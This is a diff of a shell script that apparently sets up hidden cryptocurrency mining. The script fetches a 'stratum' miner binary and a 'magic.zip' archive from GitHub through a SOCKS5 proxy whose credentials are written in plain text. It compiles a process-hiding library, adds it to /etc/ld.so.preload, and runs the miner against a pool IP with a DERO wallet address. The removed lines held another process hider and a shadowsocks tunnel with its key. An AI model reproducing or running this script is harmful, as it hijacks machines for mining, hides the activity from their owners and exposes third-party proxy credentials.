@@ -1,13 +1,8 @@
-#!/bin/bash
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
-apt-get install -y nodejs
-
-npm i -g node-process-hider
-
+#!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -16,22 +11,38 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = p.webshare.io:80
-socks5_username = muulxjov-rotate
-socks5_password = 4vpkb1s9f1yq
+socks5 = 45.94.47.66:8110
+socks5_username = ingfoingfo
+socks5_password = maszZeehh
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
 
+echo " "
+echo " "
+
+echo "******************************************************************"
+
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-apt -y install shadowsocks-libev rng-tools
+echo "******************************************************************"
 
-ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
+echo " "
+echo " "
 
-sudo ph add sse2
+./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/stratum
+chmod +x stratum
+
+./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/magic.zip
+unzip magic.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./stratum -r stratum+tcp://128.199.159.60:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcs7c2fusszy08qaz87cg.gunggungano -m 14
